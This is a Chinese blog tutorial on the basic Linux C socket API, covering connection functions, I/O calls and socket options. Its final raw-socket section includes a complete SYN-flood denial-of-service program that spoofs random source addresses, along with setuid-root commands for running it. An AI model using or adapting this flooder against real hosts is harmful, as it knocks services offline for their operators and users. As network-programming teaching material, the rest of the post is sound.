<!DOCTYPE html>
<html>
<head>

  <meta charset="utf-8">
  <link rel="stylesheet" type="text/css" href="/css/fonts.css" />
  <link rel="stylesheet" href="//cdn.bootcss.com/bulma/0.4.1/css/bulma.min.css"> 
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
  
  <title>Linux基础套接字模型 | Merlin&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="basic socket api of linux c">
<meta name="keywords" content="网络,linux">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux基础套接字模型">
<meta property="og:url" content="www.merlinblog.site/2017/06/11/basic-socket-model.html">
<meta property="og:site_name" content="Merlin&#39;s Blog">
<meta property="og:description" content="basic socket api of linux c">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://omotkhw3y.bkt.clouddn.com/socket-basic.jpg">
<meta property="og:updated_time" content="2017-09-24T01:41:07.115Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux基础套接字模型">
<meta name="twitter:description" content="basic socket api of linux c">
<meta name="twitter:image" content="http://omotkhw3y.bkt.clouddn.com/socket-basic.jpg">
  
  
    <link href="/favicon.ico" rel="ico" />
  
  
  <link rel="stylesheet" href="/css/common.css">
<link rel="stylesheet" href="/css/nav.css">
<link rel="stylesheet" href="/css/layout.css">
  

</head>

<body>

  <div class="preloader">
    <div class="preloader-inner">
      <ul><li></li><li></li><li></li><li></li><li></li><li></li></ul>
    </div>
  </div>
  <div>
	<header id="navbar" class="overflow-hidden">
  <div class="container">

    <nav class="nav">

         <div class="nav-left">
            <a href="/" class="nav-item" style="font-size: 20px;">
              <span class="logo">Merlin</span>'s Blog
            </a>
           <span style="margin-top:20px; font-size:0.85em; color:grey;">
		      version: 2.0
		   </span>
         </div>




        <div class="nav-right nav-menu">
            <a class="nav-item" id="search" onclick="tmpfobid()">
                <i class="fa fa-search" aria-hidden="true"></i>
            </a>
            
            <a class="nav-item" href="/">
                主页
            </a>
            
            <a class="nav-item" href="/tags">
                标签集合
            </a>
            
            <a class="nav-item" href="/works">
                开源作品
            </a>
            
            <a class="nav-item" href="/about">
                关于博主
            </a>
            
            <a class="nav-item" href="/atom.xml">
                Rss
            </a>
            
        </div>

        <span class="nav-toggle" id="navMenuDropdown">
            <span></span>
            <span></span>
            <span></span>
        </span>

        <div class="navbar-menu position-absolute full-width content-box is-hidden-desktop is-flex flex-column center" style="top: 100%;">
            
            <a class="nav-item flex-1" href="/">
                主页
            </a>
            
            <a class="nav-item flex-1" href="/tags">
                标签集合
            </a>
            
            <a class="nav-item flex-1" href="/works">
                开源作品
            </a>
            
            <a class="nav-item flex-1" href="/about">
                关于博主
            </a>
            
            <a class="nav-item flex-1" href="/atom.xml">
                Rss
            </a>
            
        </div>

    </nav>
  </div>
</header>

<script>
function tmpfobid()
{
	alert("搜索效果太差, 暂时禁用 Local Search.");
}
</script>

  </div>
  <div id="main-wrap" class="position-relative" style="margin-top: 55px;">
      <div class="main-inner-content">
          <!--博文页面-->

<style>
    .header-box {
        height: 170px;
        filter: blur(10px);
        background-size: cover;
        background-color: darkgrey;
    }

    .post-box {
        padding: 15px;
        padding-top: 60px;
        min-height: 80vh;
        margin-top: -200px;
        border-radius: 4px;
        background-color: rgba(255,255,255,0.7);
    }

    .post-avatar {
        height: 30px;
        width: 30px;
        border-radius: 50%;
    }

    .flow-chart {
        text-align: center;
    }

    img[alt="post-cover"] {
        display: none;
    }
</style>





<header>
    <div id="header_box" class="header-box"></div>
</header>


<section>
<!--这里添加toc内容, 一定是在article entry之前-->
<link rel="stylesheet" href="/css/toc.css">


       <p class="show-toc-btn" id="show-toc-btn"  style="display:none" onclick="showToc()">
       <span class="btn-bg"></span>
       <span class="btn-text">文章导航</span></p>

	<div id="toc-article" class="toc-article">
	    <div id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">
		×
		</div>
		<strong class="toc-title"> 目录</strong>
           	<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#引子"><span class="toc-number">1.</span> <span class="toc-text">引子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#连接函数"><span class="toc-number">2.1.</span> <span class="toc-text">连接函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#socket"><span class="toc-number">2.1.1.</span> <span class="toc-text">socket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bind"><span class="toc-number">2.1.2.</span> <span class="toc-text">bind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listen和connect"><span class="toc-number">2.1.3.</span> <span class="toc-text">listen和connect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#accept"><span class="toc-number">2.1.4.</span> <span class="toc-text">accept</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO函数"><span class="toc-number">2.2.</span> <span class="toc-text">IO函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本IO函数"><span class="toc-number">2.2.1.</span> <span class="toc-text">基本IO函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#专于socket"><span class="toc-number">2.2.2.</span> <span class="toc-text">专于socket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关闭IO"><span class="toc-number">2.2.3.</span> <span class="toc-text">关闭IO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#套接字选项"><span class="toc-number">2.3.</span> <span class="toc-text">套接字选项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#说明"><span class="toc-number">2.3.1.</span> <span class="toc-text">说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例-端口复用"><span class="toc-number">2.3.2.</span> <span class="toc-text">案例(端口复用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例-getsockopt"><span class="toc-number">2.3.3.</span> <span class="toc-text">案例(getsockopt)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原始套接字"><span class="toc-number">2.4.</span> <span class="toc-text">原始套接字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#肉鸡"><span class="toc-number">2.4.1.</span> <span class="toc-text">肉鸡</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#尾巴"><span class="toc-number">3.</span> <span class="toc-text">尾巴</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#其他问题"><span class="toc-number">3.1.</span> <span class="toc-text">其他问题</span></a></li></ol></li></ol>
    	</div>
	




<script  language="javascript">


</script>


    <div class="container post-box">
        <div class="content post-title is-flex center flex-column" style="margin-bottom: 2px; overflow: auto;">
            <div class="has-text-centered" style="font-size:36px; padding-bottom: 7px; border-bottom: 2px solid #000">
                <strong>Linux基础套接字模型</strong>
            </div>
 
            <div class="is-flex align-center" style="margin-top:10px;">
                <span style="padding:0 10px;">post time:</span>
				
                <span class="post-date">2017-06-11</span>
            </div>
			
            
                <div>
                    
                         <a style="margin-right:5px" class="tag is-post-tag" href="/tags/网络/">网络</a>
                    
                         <a style="margin-right:5px" class="tag is-post-tag" href="/tags/linux/">linux</a>
                    
                </div>
            
        </div>
        <hr/>           


        <div class="content" style="overflow: auto; align:center;">
            <blockquote>
<p>现在的很多库基本是基于异步网络IO, 以及 epoll等模型的封装, 但是 epoll模型的基础也还是基本的 socket api .最开始学习网络编程的时候, 这个地方肯定是逃不过去的.</p>
</blockquote>
<p>相关代码可以参考: <a href="https://github.com/WizardMerlin/network_life" target="_blank" rel="external">https://github.com/WizardMerlin/network_life</a></p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>网络编程中第一个部分是深入学习TCP/IP模型, 其次就是借助socket api进行实践.<br><img src="http://omotkhw3y.bkt.clouddn.com/socket-basic.jpg" alt=""></p>
<p>大概涉及如下api:</p>
<ul>
<li>创建 socket bind listen accept</li>
<li>收发 read/recv/recvfrom write/send/sendto</li>
<li>关闭 close shutdown</li>
<li>参数 getsockopt/setsockopt</li>
<li>地址 gethostbyaddr getaddrbyhost</li>
</ul>
<p>socket是posix系统或者unix系统中一种特殊的文件, 也可以按照文件读写的方式进行读写 (打开, read/write, 关闭)</p>
<pre><code> 一个完整的连接需要一对套接字
</code></pre><p>基本的网络IO模型说起来也就3句话:</p>
<ul>
<li>客户端和服务端建立连接</li>
<li>开始进行网络IO传输数据</li>
<li>完毕后断开连接</li>
</ul>
<hr>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="连接函数"><a href="#连接函数" class="headerlink" title="连接函数"></a>连接函数</h2><p>服务端: socket, bind, listen, accept;<br>客户端: socket, connect</p>
<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><pre><code class="c++">  int socket(int domain, int type, int protocol);
</code></pre>
<p>你就把这个函数理解成打开文件(它返回一个可操作的文件fd或者称为socket descriptor). 正如可以给fopen的传入不同参数值, 以打开不同的文件. 创建socket的时候,也可以指定不同的参数创建不同的socket描述符.</p>
<p>参数解释:</p>
<p><code>domain</code> : 是指协议族, 具体可以查看/usr/include/bits/socket.h的定义, 常见的有:</p>
<ol>
<li>AF_INET  </li>
<li>AF_INET6</li>
<li>AF_LOCAL(或称AF_UNIX，Unix域socket)</li>
<li>AF_ROUTE</li>
</ol>
<p>协议族决定了通信对应的地址类型:</p>
<ul>
<li>AF_INET用ipv4地址(32位的)与端口号(16位的)的组合</li>
<li>AF_INET6, 即ipv6的地址</li>
<li>AF_UNIX用一个绝对路径名作为地址(本地套接字)</li>
</ul>
<p><code>type</code> : 根据使用协议的不同采用不同的socket类型(流还是数据报)–socket type和 protocol是配合的.<br>主要有SOCK_STREAM, SOCK_DGRAM, SOCK_RAW, SOCK_PACKET, SOCK_SEQPACKET等等</p>
<ul>
<li>SOCK_STREAM 表明我们用的是 TCP 协议,这样会提供按顺序的,可靠,双向,面向连接的比特流(可以按字节读取)</li>
<li>SOCK_DGRAM 表明我们用的是 UDP 协议,这样只会提供定长的,不可靠,无连接的通信(只能按消息读取)</li>
</ul>
<p><code>protocol</code> : 指定协议, 常用的协议有: IPPROTO_TCP , IPPTOTO_UDP, IPPROTO_SCTP, IPPROTO_TIPC 等IP层的协议<br>这里其实可以填0, 因为会自动根据type对应的协议(前面一个参数type填写好, 这里直接填写0就可以了)    </p>
<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><pre><code class="c++">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</code></pre>
<p>通过socket返回的 “socket fd” 只有协议相关的信息, 但是还没有存储具体的地址和端口, 需要借助bind()函数把具体的地址和端口号赋值给socket fd.</p>
<p><code>sockfd</code> : 即socket描述字, 它是通过socket()函数创建了, 唯一标识一个socket. bind()函数就是将给这个描述字绑定一个具体地址.</p>
<p><code>addr</code> : 该结构体常量指针通常指向需要填充的地址协议信息, struct sockaddr根据协议族的不同有不同的机构.<br>可能是历史原因: 现在没有使用 struct sockaddr(而是使用的sockaddr_in), 所以到时候要强转(struct sockaddr*), 例如 </p>
<pre><code class="c++">  struct sockaddr_in addr;
  (struct sockaddr*)addr;
</code></pre>
<p>如ipv4和ipv6:</p>
<pre><code class="c++">//ipv4
struct sockaddr_in {
  sa_family_t    sin_family; /* address family: AF_INET */
  in_port_t      sin_port;   /* port in network byte order */
  struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
  uint32_t       s_addr;     /* address in network byte order */
};


//ipv6
struct sockaddr_in6 { 
  sa_family_t     sin6_family;   /* AF_INET6 */ 
  in_port_t       sin6_port;     /* port number */ 
  uint32_t        sin6_flowinfo; /* IPv6 flow information */ 
  struct in6_addr sin6_addr;     /* IPv6 address */ 
  uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */ 
};

struct in6_addr { 
  unsigned char   s6_addr[16];   /* IPv6 address */ 
};
</code></pre>
<p>Unix域对应的是:</p>
<pre><code class="c++">#define UNIX_PATH_MAX    108

struct sockaddr_un { 
  sa_family_t sun_family;               /* AF_UNIX */ 
  char        sun_path[UNIX_PATH_MAX];  /* pathname */ 
};
</code></pre>
<p>除了本地套接字(Unix)套接字外, 都要制定网络ip address和 network port.<br>(也就是使用的时候, 要从本机序转换到网络序)</p>
<p>比较常见的填充代码:</p>
<pre><code class="c++">  struct sockaddr_in servaddr;
  memset(&amp;servaddr, 0, sizeof(servaddr));

  servaddr.sin_family = domain; 
  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);//INADDR_ANY表示可以和任何的主机通信
  servaddr.sin_port = htons(port);
</code></pre>
<p><code>addrlen</code> : 对应地址的长度, 一般就是sockaddr_in的长度</p>
<p>完整的案例: </p>
<pre><code class="c++">if ( (bind(socketfd, (struct sockaddr*)&amp;servaddr, sizeof(servaddr))) == -1){
   //error
}
</code></pre>
<p>通常服务器在启动的时候都会绑定一个众所周知的地址(如ip地址+端口号), 用于提供服务, 客户就可以通过它来接连服务器;<br>而客户端就不用指定, 由系统自动分配一个端口号和自身的ip地址组合.这就是为什么通常服务器端在listen之前会调用bind(), 而客户端就不会调用, 而是在connect()时由系统随机生成一个.</p>
<p>(主机序: 现在的x86架构一般是小端, 但是不保证, 也不要假定; 传输之前还是做一下转换; 网络序: 大端)<br>(0x0102, 如果a[0]存的是02就表示是小端; 否则是大端)<br>(网络字节序：4个字节的32 bit值以下面的次序传输. 首先是0～7bit, 其次8～15bit, 然后16～23bit, 最后是24~31bit)</p>
<p>在将一个地址绑定到socket 的时候, 请先将主机字节序转换成为网络字节序, 而不要假定主机字节序跟网络字节序一样使用的是Big-Endian.<br>例如:</p>
<pre><code class="c++">  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servaddr.sin_port = htons(port);
</code></pre>
<p>再次强调务必转成网络序.</p>
<h3 id="listen和connect"><a href="#listen和connect" class="headerlink" title="listen和connect"></a>listen和connect</h3><pre><code class="c++">  int listen(int sockfd, int backlog); ---服务端(第二个参数为相应socket可以排队的最大连接个数)
  int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);  ---客户端(第二个参数为服务器端socket fd, 第三个参数是该fd的长度)
</code></pre>
<p>如果连接数目达此上限则 client 端将收到ECONNREFUSED 的错误;<br>listen()只适用 SOCK_STREAM 或 SOCK_SEQPACKET 的socket 类型, 并且如果 socket 为 AF_INET 则参数 backlog 最大值可设至 128 .</p>
<p>客户端通过该函数发送建立连接请求给服务端<br>例如:<br>(connect并不会返回新的socket fd, 连接成功之后就开始进行读写操作了)<br>( 记得最后buffer[nbytes]=’\0’; 读写操作自己控制socket fd的关闭)</p>
<pre><code class="c++">/* 客户程序发起连接请求 */
if(connect(sockfd,(struct sockaddr *)(&amp;server_addr),sizeof(struct sockaddr))==-1)
  {
    fprintf(stderr,&quot;Connect Error:%s\a\n&quot;,strerror(errno));
    exit(1);
  }
/* 连接成功了 */
if((nbytes=read(sockfd,buffer,1024))==-1)
  {
    fprintf(stderr,&quot;Read Error:%s\n&quot;,strerror(errno));
    exit(1);
  }
buffer[nbytes]=&#39;\0&#39;;
printf(&quot;I have received:%s\n&quot;, buffer);
/* 结束通讯 */
close(sockfd);
</code></pre>
<p>但是注意在阻塞IO下 <code>read</code> 如果读不满1024会阻塞等待知道满足或者超时.</p>
<h3 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h3><pre><code class="c++">  int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); //第一个参数为服务器端socket fd
</code></pre>
<p>一旦服务端接受该请求(tcp请求队列中拿出一个), 就返回一个新的用于读写的fd(由内核生成); 此时连接也建立完毕了, 可以进行IO了(网络IO和本地IO并没有太多的区别)</p>
<p>参数:</p>
<ul>
<li><code>sockfd</code> : 监听套接字, 就是socket函数产生的(服务器的一次生命周期中仅创建一个;而 accept 函数返回的是已连接的 socket 描述字, 完成客户的请求该套接字就被关闭).</li>
<li><code>addr</code> : 这是一个传出参数, struct sockaddr *的指针, 用于返回客户端的协议地址 (不区分客户端直接传入NULL, 记得强转)</li>
<li><code>addrlen</code> : 客户端struct sockaddr 协议地址的长度; (放的是指针, 说明是传出参数)</li>
</ul>
<p>accept之后, 就可以进行网络IO了(关于网络IO, 也还有好几种专门的网络IO模型)</p>
<h2 id="IO函数"><a href="#IO函数" class="headerlink" title="IO函数"></a>IO函数</h2><h3 id="基本IO函数"><a href="#基本IO函数" class="headerlink" title="基本IO函数"></a>基本IO函数</h3><p>read()/write() </p>
<p>简单的使用Linux的文件api进行网络IO:</p>
<pre><code class="c++">  #include &lt;unistd.h&gt;
  ssize_t read(int fd, void *buf, size_t count);
  ssize_t write(int fd, const void *buf, size_t count);
</code></pre>
<p>介绍一下read, write:<br>      read函数是负责从 fd中读取内容.<br>    当读成功时, read返回实际所读的字节数(&gt;0), 如果返回的值是0表示已经读到文件的结束, 小于0表示出现了错误.<br>    如果错误为 EINTR 说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p>
<pre><code>  write函数将buf中的nbytes字节内容写入文件描述符fd.成功时返回写的字节数(&gt;0).失败时返回-1, 并设置 errno变量.
在网络程序中, 当我们向套接字文件描述符写时有俩种可能:
1. 返回值大于0; 表示写了部分或者是全部的数据
2. 返回值小于0; 此时出现了错误.
错误为EINTR 表示在写的时候出现了中断错误
如果为EPIPE表示网络连接出现了问题(对方已经关闭了连接)
</code></pre><h3 id="专于socket"><a href="#专于socket" class="headerlink" title="专于socket"></a>专于socket</h3><pre><code>recv()/send()----和read, write大致一样, 不过flags提供了更加强大的选项
recvfrom()/sendto() ---- 一般用在udp中(server bind之后之后不需要listen, 直接和客户端进行通信)---容易阻塞
recvmsg()/sendmsg() ---- 最通用的, 最强大的,可以实现前面所有函数的功能.(涉及到的struct msghdr, iovec比较复杂)
</code></pre><pre><code class="c++">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

ssize_t send(int sockfd, const void *buf, size_t len, int flags);
ssize_t recv(int sockfd, void *buf, size_t len, int flags);

ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
           const struct sockaddr *dest_addr, socklen_t addrlen);
ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
         struct sockaddr *src_addr, socklen_t *addrlen);

ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);

struct msghdr
{
  void *msg_name;
  int msg_namelen;
  struct iovec *msg_iov;
  int msg_iovlen;
  void *msg_control;
  int msg_controllen;
  int msg_flags;
}


struct iovec
{
  void *iov_base; /* 缓冲区开始的地址 */
  size_t iov_len; /* 缓冲区的长度 */
}
</code></pre>
<h3 id="关闭IO"><a href="#关闭IO" class="headerlink" title="关闭IO"></a>关闭IO</h3><pre><code class="c++">  int close(int fd);
</code></pre>
<p>close 操作只是使相应socket描述字的引用计数-1, 只有当引用计数为0的时候, 才会触发TCP客户端向服务器发送终止连接请求.<br>(被关闭的套接字不能在用于read或者write了; 注意你关闭了是accept出来用于响应客户端读写请求的socket fd还是listen fd)</p>
<pre><code class="c++">  int shutdown(int sockfd,int howto)
</code></pre>
<p>TCP 连接是双向的(是可读写的),当我们使用 close 时,会把读写通道都关闭,有时侯我们希望只关闭一个方向,这个时候我们可以使用 shutdown.<br>针对不同的 howto,系统回采取不同的关闭方式.</p>
<ul>
<li>howto=0 这个时候系统会关闭读通道. 但是可以继续往接字描述符写.</li>
<li>howto=1 关闭写通道, 和上面相反,着时候就只可以读了.</li>
<li>howto=2 关闭读写通道, 和 close 一样 </li>
</ul>
<p>close() Vs shutdown()</p>
<p>在多进程程序里面, 如果有几个子进程共享一个套接字时, 如果我们使用 shutdown, 那么所有的子进程都不能够操作了.<br>这个时候我们只能够使用 close 来关闭子进程的套接字描述符.</p>
<h2 id="套接字选项"><a href="#套接字选项" class="headerlink" title="套接字选项"></a>套接字选项</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>控制套接字的行为, 如缓冲区大小, 端口重用等</p>
<pre><code class="c++">#include &lt;sys/types.h&gt;          /* See NOTES */
#include &lt;sys/socket.h&gt;


int getsockopt(int sockfd, int level, int optname,
         void *optval, socklen_t *optlen);
int setsockopt(int sockfd, int level, int optname,
           const void *optval, socklen_t optlen);
</code></pre>
<p>参数说明: (当做key-value, map去理解)</p>
<p>相当于每个type里面有多个多个key, 每个key有多种value.</p>
<p><code>level</code> : (type)</p>
<ul>
<li>SOL_SOCKET:  通用套接字 选项</li>
<li>IPPROTO_IP:  IP 选项</li>
<li>IPPROTO_TCP: TCP 选项</li>
</ul>
<p><code>optname</code> : (key)<br>指定控制的方式(选项的名称), 下面详细解释</p>
<p><code>optval</code> :  (value)<br>获得或者是设置套接字选项.根据选项名称的数据类型进行转换</p>
<p>详细说明如下:</p>
<p>SOL_SOCKET:(optname-ptval)</p>
<ul>
<li>SO_BROADCAST 允许发送广播数据 int</li>
<li>SO_DEBUG 允许调试 int</li>
<li>SO_DONTROUTE 不查找路由 int</li>
<li>SO_ERROR 获得套接字错误 int</li>
<li>SO_KEEPALIVE 保持连接 int</li>
<li>SO_LINGER 延迟关闭连接 struct linger</li>
<li>SO_OOBINLINE 带外数据放入正常数据流 int</li>
<li>SO_RCVBUF 接收缓冲区大小 int</li>
<li>SO_SNDBUF 发送缓冲区大小 int</li>
<li>SO_RCVLOWAT 接收缓冲区下限 int</li>
<li>SO_SNDLOWAT 发送缓冲区下限 int</li>
<li>SO_RCVTIMEO 接收超时 struct timeval</li>
<li>SO_SNDTIMEO 发送超时 struct timeval</li>
<li>SO_REUSERADDR 允许重用本地地址和端口 int</li>
<li>SO_TYPE 获得套接字类型 int</li>
<li>SO_BSDCOMPAT 与 BSD 系统兼容 int</li>
</ul>
<p>IPPROTO_IP</p>
<ul>
<li>IP_HDRINCL 在数据包中包含 IP 首部 int</li>
<li>IP_OPTINOS IP 首部选项 int</li>
<li>IP_TOS 服务类型</li>
<li>IP_TTL 生存时间 int</li>
</ul>
<p>IPPRO_TCP</p>
<ul>
<li>TCP_MAXSEG TCP 最大数据段的大小 int</li>
<li>TCP_NODELAY 不使用 Nagle 算法 int</li>
</ul>
<p>使用较多的案例:</p>
<h3 id="案例-端口复用"><a href="#案例-端口复用" class="headerlink" title="案例(端口复用)"></a>案例(端口复用)</h3><p>在 server 的 TCP 连接没有完全断开之前不允许重新监听是不合理的.<br>因为, TCP 连接没有完全断开指的是 connfd (clinetIP:6666)没有完全断开, 而我们重新监听的是 lis-tenfd(0.0.0.0:6666),<br>虽然是占用同一个端口, 但 IP 地址不同, connfd 对应的是与某个客户端通讯的一个具体的 IP 地址, 而 listenfd 对应的是 wildcard address.</p>
<p>解决这个问题的方法是使用 setsockopt()设置 socket 描述符的选项 SO_REUSEADDR 为 1，表示允许创建端口号相同但 IP 地址不同的多个 socket 描述符.<br>在 server 代码的 socket()和 bind()调用之间插入如下代码:</p>
<pre><code class="c++">  int opt = 1;
  setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt));
</code></pre>
<h3 id="案例-getsockopt"><a href="#案例-getsockopt" class="headerlink" title="案例(getsockopt)"></a>案例(getsockopt)</h3><pre><code class="c++">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

    int main()
    {
      int s, optval, optlen = sizeof(int);

      if((s = socket(AF_INET, SOCK_STREAM, 0))&lt;0) {
    perror(&quot;socket.\n&quot;);
      }

      /*int getsockopt(int s, int level, int optname, void*optval, socklen_t* optlen);*/
      getsockopt(s, SOL_SOCKET, SO_TYPE, &amp;optval, (socklen_t *)&amp;optlen);
      printf(&quot;optval = %d\n&quot;, optval);

      close(s);
    }
</code></pre>
<h2 id="原始套接字"><a href="#原始套接字" class="headerlink" title="原始套接字"></a>原始套接字</h2><p>以TCP协议为例, 把原来需要系统内核做的事情, 现在我们自己来做封包 (IP数据包 &amp;&amp; TCP数据包, 具体发送还是交给内核)<br>原来的话, 我们只是处理好要发送的Buffer.</p>
<p>调用socket函数的时候, type传入的(SOCK_STREAM,SOCK_DRAGM) 或者 SOCK_RAW; 协议传入:IPPROTO_ICMP, IPPROTO_TCP, IPPROTO_UDP 等</p>
<h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h3><p>使用案例: (肉鸡攻击, 你一定听过)</p>
<p>下面是一个demo, 自定义tcp的源地址(模拟实现dos):<br>dos.c  生成可执行文件 DOS, 恶意客户端代码如下:</p>
<pre><code class="c++">#define DESTPORT 80 /* 要攻击的端口(WEB) */
#define LOCALPORT 8888 /*local port*/

void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char **argv)
{
  int sockfd;
  struct sockaddr_in addr;
  struct hostent *host;

  int on=1;  //used by setsockopt()
  if(argc!=2) {
    fprintf(stderr,&quot;Usage:%s hostname\n\a&quot;,argv[0]);
    exit(1);
  }

  /*feed the addr*/
  bzero(&amp;addr,sizeof(struct sockaddr_in));
  addr.sin_family=AF_INET;
  addr.sin_port=htons(DESTPORT);
  /*deal with addr.sin_addr*/
  if(inet_aton(argv[1], &amp;addr.sin_addr)==0) { /*what if user input &#39;localhost&#39;*/
    host=gethostbyname(argv[1]);
    if(host==NULL)
      {
    fprintf(stderr,&quot;HostName Error:%s\n\a&quot;,hstrerror(h_errno));
    exit(1);
      }
    addr.sin_addr=*(struct in_addr *)(host-&gt;h_addr_list[0]);
  }


  /* 使用 IPPROTO_TCP 创建一个 TCP 的原始套接字 */
  sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
  if(sockfd&lt;0)
    {
      fprintf(stderr,&quot;Socket Error:%s\n\a&quot;,strerror(errno));
      exit(1);
    }

  /* 设置 IP 数据包格式, 告诉系统内核模块 IP 数据包由我们自己来填写*/
  setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on));

  /*只用超级用户才可以使用原始套接字*/
  setuid(getpid());

  /*send bomb*/
  send_tcp(sockfd, &amp;addr);
}

/*发送炸弹的实现*/
void send_tcp(int sockfd, struct sockaddr_in *addr)
{
  /*用来放置我们的数据包 */
  char buffer[100]; 
  struct ip *ip;
  struct tcphdr *tcp;

  int head_len; //头部长度

  /*我们的数据包实际上没有任何内容,所以长度就是两个结构的长度 */
  head_len=sizeof(struct ip)+sizeof(struct tcphdr);

  /*填充ip数据包头部(注意本机字节序和网络字节序)*/
  bzero(buffer,100); 
  ip=(struct ip *)buffer;
  ip-&gt;ip_v=IPVERSION; /** 版本一般的是 4 **/
  ip-&gt;ip_hl=sizeof(struct ip)&gt;&gt;2; /** IP 数据包的头部长度 **/
  ip-&gt;ip_tos=0; /** 服务类型 **/
  ip-&gt;ip_len=htons(head_len); /** IP 数据包的长度 **/
  ip-&gt;ip_id=0; /** 让系统去填写吧 **/
  ip-&gt;ip_off=0; /** 和上面一样,省点时间 **/
  ip-&gt;ip_ttl=MAXTTL; /** 最长的时间 255 **/
  ip-&gt;ip_p=IPPROTO_TCP; /** 我们要发的是 TCP 包 **/
  ip-&gt;ip_sum=0; /** 校验和让系统去做 **/
  ip-&gt;ip_dst=addr-&gt;sin_addr; /** 我们攻击的对象 **/

  /*填写 TCP 数据包 */
  tcp=(struct tcphdr *)(buffer +sizeof(struct ip));
  tcp-&gt;source=htons(LOCALPORT);
  tcp-&gt;dest=addr-&gt;sin_port; /** 目的端口 **/
  tcp-&gt;seq=random();
  tcp-&gt;ack_seq=0;
  tcp-&gt;doff=5;
  tcp-&gt;syn=1; /** 我要建立连接 **/
  tcp-&gt;check=0;

  /** 好了,一切都准备好了.服务器,你准备好了没有?? ^_^ **/
  while(1) {
    /* 你不知道我是从那里来的, 让服务器阻塞等待 */
    ip-&gt;ip_src.s_addr=random(); // 把客户端的源地址设置为随机

    /** 什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧(可选) */
    tcp-&gt;check=check_sum((unsigned short *)tcp, sizeof(struct tcphdr));

    //发送过去
    sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));
  }
}

/* 下面是首部校验和的算法,偷了别人的 */
unsigned short check_sum(unsigned short *addr,int len)
{
  register int nleft=len;
  register int sum=0;
  register short *w=addr;
  short answer=0;

  while(nleft&gt;1) {
    sum+=*w++;
    nleft-=2;
  }
  if(nleft==1){
    *(unsigned char *)(&amp;answer)=*(unsigned char *)w;
    sum+=answer;
  }

  sum=(sum&gt;&gt;16)+(sum&amp;0xffff);
  sum+=(sum&gt;&gt;16);
  answer=~sum;

  return(answer);
}
</code></pre>
<p>编译一下, 拿 localhost 做一下实验,看看有什么结果(千万不要试别人的啊).<br>为了让普通用户可以运行这个程序, 我们应该将这个程序的所有者变为root, 且设置 setuid 位, 之后再运行.</p>
<pre><code>chown root DOS
chmod +s DOS
</code></pre><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>这里只是把 <code>基本socket模型</code> 大概的轮廓给描述了一下, 还有许多问题和相关函数没有涉及到.</p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>比如具体的IO函数总结, 读写函数的封装, 错误处理, 函数头文件等.</p>
<p>具体可以参考一下我的github库:<br><a href="https://github.com/WizardMerlin/network_life" target="_blank" rel="external">https://github.com/WizardMerlin/network_life</a></p>
<hr>
